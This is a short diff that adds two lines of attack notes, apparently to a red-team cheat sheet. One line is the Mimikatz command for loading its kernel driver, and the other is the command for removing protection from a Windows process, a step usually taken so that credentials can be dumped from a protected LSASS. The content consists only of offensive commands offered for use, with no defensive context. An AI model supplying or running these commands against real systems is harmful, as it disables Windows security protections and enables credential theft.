@@ -1,0 +1,2 @@
+- to start mimikatz `!+`
+- to remove protection `!processprotect /process:<process> /remove`
